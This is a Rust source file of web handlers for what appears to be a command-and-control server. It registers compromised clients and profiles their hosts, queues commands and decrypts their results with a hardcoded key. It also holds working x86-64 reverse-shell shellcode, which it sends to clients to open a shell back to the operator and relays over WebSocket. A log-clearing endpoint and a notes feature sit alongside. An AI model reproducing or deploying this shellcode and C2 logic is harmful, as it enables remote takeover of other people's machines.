use crate::state::AppState;
use axum::extract::ws::{Message as WsMessage, WebSocket, WebSocketUpgrade};
use axum::{
    extract::{Path, State},
    http::StatusCode,
    Json,
};
use base64::Engine as _;
use common::crypto::Cipher;
use common::message::{
    ClientInfo, CommandRequest, CommandResponse, EncryptedCommandResponse, Message,
};
use common::sysinfo::get_local_ip;
use futures::{sink::SinkExt, stream::StreamExt};
use serde::{Deserialize, Serialize};
use std::fs;
use std::future::Future;
use std::net::Ipv4Addr;
use std::pin::Pin;
use tracing::{error, info};

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Note {
    pub id: String,
    pub title: String,
    pub content: String,
    pub created_at: String,
    pub updated_at: Option<String>,
}

/// Generates reverse shell shellcode for a given IP and port.
pub fn generate_reverse_shell(ip: &str, port: u16) -> Vec<u8> {
    let ip_addr: Ipv4Addr = ip.parse().expect("Invalid IPv4 address");
    let port_bytes = port.to_be_bytes();
    let ip_bytes = ip_addr.octets();

    let sockaddr_bytes: [u8; 8] = [
        0x02,
        0x00,
        port_bytes[0],
        port_bytes[1],
        ip_bytes[0],
        ip_bytes[1],
        ip_bytes[2],
        ip_bytes[3],
    ];

    let mut shellcode = vec![
        0x6A, 0x29, 0x58, 0x99, 0x6A, 0x02, 0x5F, 0x6A, 0x01, 0x5E, 0x0F, 0x05, 0x48, 0x97, 0x48,
        0xB9,
    ];
    shellcode.extend_from_slice(&sockaddr_bytes);
    shellcode.extend([
        0x51, 0x48, 0x89, 0xE6, 0x6A, 0x10, 0x5A, 0x6A, 0x2A, 0x58, 0x0F, 0x05, 0x6A, 0x03, 0x5E,
        0x48, 0xFF, 0xCE, 0x6A, 0x21, 0x58, 0x0F, 0x05, 0x75, 0xF6, 0x6A, 0x3B, 0x58, 0x99, 0x48,
        0xBB, 0x2F, 0x62, 0x69, 0x6E, 0x2F, 0x73, 0x68, 0x00, 0x53, 0x48, 0x89, 0xE7, 0x52, 0x57,
        0x48, 0x89, 0xE6, 0x0F, 0x05,
    ]);

    shellcode
}

/// Client registration handler
pub async fn register_client(
    State(state): State<AppState>,
    Json(message): Json<Message>,
) -> Result<StatusCode, StatusCode> {
    if let Ok(client_info) = serde_json::from_slice::<ClientInfo>(&message.payload) {
        // Log the client connection and register the client in the client manager
        state.audit_logger.log_client_connect(&client_info);
        state.client_manager.register_client(client_info).await;
        Ok(StatusCode::OK)
    } else {
        state
            .audit_logger
            .log_error("Failed to deserialize client info for registration");
        Err(StatusCode::BAD_REQUEST)
    }
}

/// Heartbeat handler
pub async fn handle_heartbeat(
    State(state): State<AppState>,
    Json(message): Json<Message>,
) -> Result<StatusCode, StatusCode> {
    // The payload for heartbeat is just the client_id as a string
    if let Ok(client_id) = String::from_utf8(message.payload) {
        state.client_manager.update_heartbeat(&client_id).await;
        Ok(StatusCode::OK)
    } else {
        state
            .audit_logger
            .log_error("Failed to deserialize client_id for heartbeat");
        Err(StatusCode::BAD_REQUEST)
    }
}

/// Get commands for a specific client
pub async fn get_commands(
    State(state): State<AppState>,
    Path(client_id): Path<String>,
) -> Result<Json<Vec<CommandRequest>>, StatusCode> {
    let client_commands = state.client_manager.get_commands(&client_id).await;
    Ok(Json(client_commands))
}

/// Handle command result with encryption support
pub fn handle_command_result(
    State(state): State<AppState>,
    Json(message): Json<Message>,
) -> Pin<Box<dyn Future<Output = Result<StatusCode, StatusCode>> + Send>> {
    Box::pin(async move {
        // Try to decrypt first (before any await)
        let decrypted_result = if let Ok(encrypted_result) =
            serde_json::from_slice::<EncryptedCommandResponse>(&message.payload)
        {
            let key = b"your-32-byte-secret-key-here!!!!";
            let cipher = Cipher::new(key);

            match cipher.decrypt(&encrypted_result.encrypted_data) {
                Ok(decrypted_data) => {
                    if let Ok(decrypted_json) = String::from_utf8(decrypted_data) {
                        if let Ok(data) = serde_json::from_str::<serde_json::Value>(&decrypted_json)
                        {
                            Some((
                                encrypted_result.client_id,
                                encrypted_result.executed_at,
                                data,
                            ))
                        } else {
                            None
                        }
                    } else {
                        None
                    }
                }
                Err(_) => None,
            }
        } else {
            None
        };

        // Handle decrypted result
        if let Some((client_id, executed_at, data)) = decrypted_result {
            let result = CommandResponse {
                client_id,
                command: data["command"].as_str().unwrap_or("").to_string(),
                stdout: data["stdout"].as_str().unwrap_or("").to_string(),
                stderr: data["stderr"].as_str().unwrap_or("").to_string(),
                exit_code: data["exit_code"].as_i64().unwrap_or(0) as i32,
                executed_at,
            };

            state.audit_logger.log_command_result(&result);
            state.client_manager.add_command_result(result).await;
            return Ok(StatusCode::OK);
        }

        // Fallback: regular command response
        if let Ok(result) = serde_json::from_slice::<CommandResponse>(&message.payload) {
            state.audit_logger.log_command_result(&result);
            state.client_manager.add_command_result(result).await;
            Ok(StatusCode::OK)
        } else {
            state
                .audit_logger
                .log_error("Failed to deserialize command result");
            Err(StatusCode::BAD_REQUEST)
        }
    })
}

/// Send command to a specific client (used by web UI)
pub async fn send_command(
    State(state): State<AppState>,
    Path(client_id): Path<String>,
    Json(mut cmd): Json<CommandRequest>,
) -> Result<StatusCode, StatusCode> {
    cmd.client_id = client_id.clone();
    // Ensure shellcode is None if not provided, or handle it as needed
    if cmd.shellcode.is_none() {
        cmd.shellcode = None;
    }
    // Log the command execution and add it to the client manager
    state.audit_logger.log_command_execution(&cmd);
    state.client_manager.add_command(&client_id, cmd).await;
    Ok(StatusCode::OK)
}

/// Get all clients (used by web UI)
pub async fn api_clients(State(state): State<AppState>) -> Json<Vec<ClientInfo>> {
    let clients_vec = state.client_manager.get_clients().await;
    Json(clients_vec)
}

/// Delete a specific client (used by web UI)
pub async fn delete_client(
    State(state): State<AppState>,
    Path(client_id): Path<String>,
) -> Result<Json<serde_json::Value>, StatusCode> {
    if state.client_manager.delete_client(&client_id).await {
        // Log client deletion to audit log
        state.audit_logger.log_client_disconnect(&client_id);
        state.audit_logger.log_client_lifecycle(
            &client_id,
            "DELETE",
            "Manual deletion via web interface",
        );

        info!("Client {} deleted successfully", client_id);
        Ok(Json(serde_json::json!({
            "success": true,
            "message": "客户端删除成功"
        })))
    } else {
        info!("Client {} not found for deletion", client_id);
        Err(StatusCode::NOT_FOUND)
    }
}

/// Get all clients with display info (used by web UI dashboard)
pub async fn api_clients_display(State(state): State<AppState>) -> Json<serde_json::Value> {
    let clients = state.client_manager.get_clients().await;
    let current_timestamp = chrono::Utc::now().timestamp();

    let display_clients: Vec<crate::handlers::web::DisplayClientInfo> = clients
        .into_iter()
        .map(|c| {
            let is_online =
                (current_timestamp - c.last_seen.timestamp()) < state.config.client_timeout as i64;
            crate::handlers::web::DisplayClientInfo {
                id: c.id,
                hostname: c.hostname,
                username: c.username,
                os: c.os,
                arch: c.arch,
                ip: c.ip,
                country_info: c.country_info,
                cpu_brand: c.cpu_brand,
                cpu_frequency: c.cpu_frequency,
                cpu_cores: c.cpu_cores,
                memory: c.memory,
                total_disk_space: c.total_disk_space,
                available_disk_space: c.available_disk_space,
                total_disk_space_gb: format!("{:.2}", c.total_disk_space as f64),
                available_disk_space_gb: format!("{:.2}", c.available_disk_space as f64),
                connected_at: c.connected_at,
                last_seen: c.last_seen,
                is_online,
            }
        })
        .collect();

    let online_clients_count = display_clients.iter().filter(|c| c.is_online).count();
    let os_types_count = display_clients
        .iter()
        .map(|c| c.os.as_str())
        .collect::<std::collections::HashSet<_>>()
        .len();

    Json(serde_json::json!({
        "clients": display_clients,
        "online_clients_count": online_clients_count,
        "os_types_count": os_types_count,
        "total_clients": display_clients.len()
    }))
}

/// Get command results for a specific client (used by web UI)
pub async fn api_command_results(
    State(state): State<AppState>,
    Path(client_id): Path<String>,
) -> Json<Vec<CommandResponse>> {
    let results = state.client_manager.get_command_results(&client_id).await;
    Json(results)
}

/// Initiate a reverse shell for a specific client (used by web UI)
pub async fn initiate_reverse_shell(
    State(state): State<AppState>,
    Path(client_id): Path<String>,
) -> Result<Json<serde_json::Value>, StatusCode> {
    // Get the server IP and reverse shell port from the state
    let server_ip = get_local_ip()
        .await
        .map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?
        .to_string();
    let reverse_shell_port = state.config.reverse_shell_port;

    // Check if a listener is already active on this port
    info!(
        "Starting reverse shell listener on demand for port {}",
        reverse_shell_port
    );
    let shell_manager_clone = state.shell_manager.clone();
    let audit_logger_clone = state.audit_logger.clone();

    // Initialize the reverse shell manager if not already done
    tokio::spawn(async move {
        if let Err(e) = crate::reverse_shell_listener::start_listener(
            reverse_shell_port,
            shell_manager_clone,
            audit_logger_clone,
        )
        .await
        {
            error!("Failed to start reverse shell listener: {}", e);
        }
    });

    // Generate the reverse shell shellcode
    let shellcode_bytes = generate_reverse_shell(&server_ip, reverse_shell_port);
    let shellcode_base64 = base64::engine::general_purpose::STANDARD.encode(&shellcode_bytes);

    // Create and send the reverse shell command (no session needed anymore)
    let command: CommandRequest = CommandRequest {
        client_id: client_id.clone(),
        command: "REVERSE_SHELL".to_string(),
        args: vec![], // No session_id needed
        message_id: None,
        shellcode: Some(shellcode_base64),
    };

    state.audit_logger.log_command_execution(&command);
    state.client_manager.add_command(&client_id, command).await;

    // Return success with more detailed information
    Ok(Json(serde_json::json!({
        "success": true,
        "message": format!("Reverse shell listener started on port {} and command sent to client", reverse_shell_port),
        "server_ip": server_ip,
        "port": reverse_shell_port
    })))
}

/// Handle reverse shell WebSocket connection
pub async fn handle_reverse_shell_websocket(
    ws: WebSocketUpgrade,
    Path(connection_id): Path<String>,
    State(_state): State<AppState>,
) -> axum::response::Response {
    ws.on_upgrade(move |socket| handle_reverse_shell_socket(socket, connection_id))
}

/// Handles the WebSocket connection for reverse shell communication.
async fn handle_reverse_shell_socket(socket: WebSocket, connection_id: String) {
    info!(
        "WebSocket connection established for reverse shell: {}",
        connection_id
    );

    // Get the reverse shell connection from the manager
    let manager = crate::reverse_shell_listener::get_reverse_shell_manager();
    let connection_option = manager.get_connection(&connection_id).await;

    if connection_option.is_none() {
        error!("No active reverse shell found for ID: {}", connection_id);
        let mut socket = socket;
        let _ = socket
            .send(WsMessage::Text(
                "Error: No active reverse shell connection.".into(),
            ))
            .await;
        let _ = socket.close().await;
        return;
    }

    let (tx_to_shell, mut rx_from_shell) = connection_option.unwrap();

    // Split the WebSocket into sender and receiver
    let (mut sender, mut receiver) = socket.split();

    // Clone connection_id for tasks
    let connection_id_recv = connection_id.clone();

    // Task to send data from shell to WebSocket
    let mut send_task = tokio::spawn(async move {
        while let Ok(data) = rx_from_shell.recv().await {
            let text = String::from_utf8_lossy(&data).to_string();
            if sender.send(WsMessage::Text(text.into())).await.is_err() {
                break;
            }
        }
    });

    // Task to receive data from WebSocket and send to shell
    let mut recv_task = tokio::spawn(async move {
        while let Some(Ok(msg)) = receiver.next().await {
            match msg {
                WsMessage::Text(text) => {
                    if tx_to_shell
                        .send(text.bytes().collect::<Vec<u8>>())
                        .await
                        .is_err()
                    {
                        error!(
                            "Failed to send data to reverse shell {}",
                            connection_id_recv
                        );
                        break;
                    }
                }
                WsMessage::Binary(bin) => {
                    if tx_to_shell.send(bin.to_vec()).await.is_err() {
                        error!(
                            "Failed to send binary data to reverse shell {}",
                            connection_id_recv
                        );
                        break;
                    }
                }
                WsMessage::Close(_) => {
                    info!(
                        "WebSocket close received for reverse shell {}",
                        connection_id_recv
                    );
                    break;
                }
                _ => {}
            }
        }
    });

    // If any task completes, abort the other
    tokio::select! {
        _ = (&mut send_task) => recv_task.abort(),
        _ = (&mut recv_task) => send_task.abort(),
    }

    info!(
        "WebSocket connection closed for reverse shell: {}",
        connection_id
    );
}

/// List active reverse shell connections
pub async fn list_reverse_shells(State(_state): State<AppState>) -> Json<serde_json::Value> {
    let manager = crate::reverse_shell_listener::get_reverse_shell_manager();
    let connections = manager.list_connections().await;

    Json(serde_json::json!({
        "connections": connections,
        "count": connections.len()
    }))
}

/// Close a reverse shell connection
pub async fn close_reverse_shell(
    Path(connection_id): Path<String>,
    State(_state): State<AppState>,
) -> Json<serde_json::Value> {
    let manager = crate::reverse_shell_listener::get_reverse_shell_manager();
    let success = manager.close_connection(&connection_id).await;

    if success {
        Json(serde_json::json!({
            "success": true,
            "message": format!("Shell连接 {} 已关闭", connection_id)
        }))
    } else {
        Json(serde_json::json!({
            "success": false,
            "message": format!("Shell连接 {} 不存在或已关闭", connection_id)
        }))
    }
}

/// Handle file operation response from clients
pub async fn handle_file_operation_response(
    State(state): State<AppState>,
    Path(client_id): Path<String>,
    Json(message): Json<Message>,
) -> Result<StatusCode, StatusCode> {
    info!(
        "Received file operation response from client {}: message_id={}, payload_size={}",
        client_id,
        message.id,
        message.payload.len()
    );

    // Log the payload for debugging
    if let Ok(payload_str) = String::from_utf8(message.payload.clone()) {
        info!("File operation response payload: {}", payload_str);
    }

    // Try event-driven notification first
    if state.notify_response(&message.id, message.clone()).await {
        info!(
            "Successfully notified event-driven listener for message {}",
            message.id
        );
    } else {
        // Fall back to legacy storage method
        state
            .client_manager
            .add_file_operation_response(&client_id, message)
            .await;
        info!(
            "Stored file operation response for client {} (legacy mode)",
            client_id
        );
    }

    Ok(StatusCode::OK)
}

/// Get server logs
pub async fn get_logs(State(state): State<AppState>) -> Result<String, StatusCode> {
    let log_file_path = &state.config.log_file;

    match std::fs::read_to_string(log_file_path) {
        Ok(content) => Ok(content),
        Err(e) => {
            error!("Failed to read log file {}: {}", log_file_path, e);
            Err(StatusCode::INTERNAL_SERVER_ERROR)
        }
    }
}

/// Clear server logs
pub async fn clear_logs(
    State(state): State<AppState>,
) -> Result<Json<serde_json::Value>, StatusCode> {
    let log_file_path = &state.config.log_file;

    match std::fs::write(log_file_path, "") {
        Ok(()) => {
            info!("Server logs cleared by web interface");
            Ok(Json(serde_json::json!({
                "success": true,
                "message": "日志已成功清除"
            })))
        }
        Err(e) => {
            error!("Failed to clear log file {}: {}", log_file_path, e);
            Err(StatusCode::INTERNAL_SERVER_ERROR)
        }
    }
}

const NOTES_FILE: &str = "data/notes.json";

/// Read notes from the file
fn read_notes() -> Result<Vec<Note>, String> {
    let content =
        fs::read_to_string(NOTES_FILE).map_err(|e| format!("Failed to read notes file: {e}"))?;

    if content.trim().is_empty() {
        return Ok(Vec::new());
    }

    serde_json::from_str(&content).map_err(|e| format!("Failed to parse notes JSON: {e}"))
}

/// Write notes to the file
fn write_notes(notes: &[Note]) -> Result<(), String> {
    let json_content = serde_json::to_string_pretty(notes)
        .map_err(|e| format!("Failed to serialize notes: {e}"))?;

    fs::write(NOTES_FILE, json_content)
        .map_err(|e| format!("Failed to write notes file: {e}"))?;

    Ok(())
}

/// Get all notes
pub async fn get_notes(State(_state): State<AppState>) -> Result<Json<Vec<Note>>, StatusCode> {
    match read_notes() {
        Ok(notes) => Ok(Json(notes)),
        Err(e) => {
            error!("Failed to read notes: {}", e);
            Err(StatusCode::INTERNAL_SERVER_ERROR)
        }
    }
}

/// 创建新备忘录
pub async fn create_note(
    State(_state): State<AppState>,
    Json(mut note): Json<Note>,
) -> Result<Json<Note>, StatusCode> {
    // 生成唯一ID
    note.id = uuid::Uuid::new_v4().to_string();
    note.created_at = chrono::Utc::now().format("%Y-%m-%d %H:%M:%S").to_string();
    note.updated_at = None;

    match read_notes() {
        Ok(mut notes) => {
            notes.insert(0, note.clone()); // 插入到开头，保持最新的在前
            match write_notes(&notes) {
                Ok(()) => {
                    info!("Created new note with ID: {}", note.id);
                    Ok(Json(note))
                }
                Err(e) => {
                    error!("Failed to save note: {}", e);
                    Err(StatusCode::INTERNAL_SERVER_ERROR)
                }
            }
        }
        Err(e) => {
            error!("Failed to read existing notes: {}", e);
            Err(StatusCode::INTERNAL_SERVER_ERROR)
        }
    }
}

/// 更新备忘录
pub async fn update_note(
    State(_state): State<AppState>,
    Path(note_id): Path<String>,
    Json(updated_note): Json<Note>,
) -> Result<Json<Note>, StatusCode> {
    match read_notes() {
        Ok(mut notes) => {
            if let Some(note) = notes.iter_mut().find(|n| n.id == note_id) {
                note.title = updated_note.title;
                note.content = updated_note.content;
                note.updated_at = Some(chrono::Utc::now().format("%Y-%m-%d %H:%M:%S").to_string());

                let note_clone = note.clone();
                match write_notes(&notes) {
                    Ok(()) => {
                        info!("Updated note with ID: {}", note_id);
                        Ok(Json(note_clone))
                    }
                    Err(e) => {
                        error!("Failed to save updated note: {}", e);
                        Err(StatusCode::INTERNAL_SERVER_ERROR)
                    }
                }
            } else {
                error!("Note not found with ID: {}", note_id);
                Err(StatusCode::NOT_FOUND)
            }
        }
        Err(e) => {
            error!("Failed to read notes: {}", e);
            Err(StatusCode::INTERNAL_SERVER_ERROR)
        }
    }
}

/// 删除备忘录
pub async fn delete_note(
    State(_state): State<AppState>,
    Path(note_id): Path<String>,
) -> Result<StatusCode, StatusCode> {
    match read_notes() {
        Ok(mut notes) => {
            let original_len = notes.len();
            notes.retain(|n| n.id != note_id);

            if notes.len() < original_len {
                match write_notes(&notes) {
                    Ok(()) => {
                        info!("Deleted note with ID: {}", note_id);
                        Ok(StatusCode::OK)
                    }
                    Err(e) => {
                        error!("Failed to save notes after deletion: {}", e);
                        Err(StatusCode::INTERNAL_SERVER_ERROR)
                    }
                }
            } else {
                error!("Note not found with ID: {}", note_id);
                Err(StatusCode::NOT_FOUND)
            }
        }
        Err(e) => {
            error!("Failed to read notes: {}", e);
            Err(StatusCode::INTERNAL_SERVER_ERROR)
        }
    }
}
